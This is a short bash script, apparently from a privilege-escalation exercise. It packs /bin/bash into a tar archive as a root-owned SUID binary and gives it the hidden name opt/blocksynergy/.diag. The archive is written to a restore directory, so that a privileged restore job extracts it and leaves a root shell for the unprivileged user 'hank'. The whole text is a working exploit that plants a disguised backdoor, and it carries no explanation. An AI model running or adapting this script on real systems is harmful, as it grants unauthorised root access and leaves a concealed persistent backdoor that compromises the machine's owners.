#!/bin/bash
# Pack /bin/bash as a root-owned SUID file at opt/blocksynergy/.diag
# Run as hank. Output must live on the SAME filesystem as /var/restore_work.
set -euo pipefail
OUT="${1:-/var/restore_work/restore_suid.tar.gz}"
tar --owner=0 --group=0 --mode=4755 \
  --transform='s|^bash$|opt/blocksynergy/.diag|' \
  -czf "$OUT" -C /bin bash
echo "[*] $OUT"
tar -tvzf "$OUT"
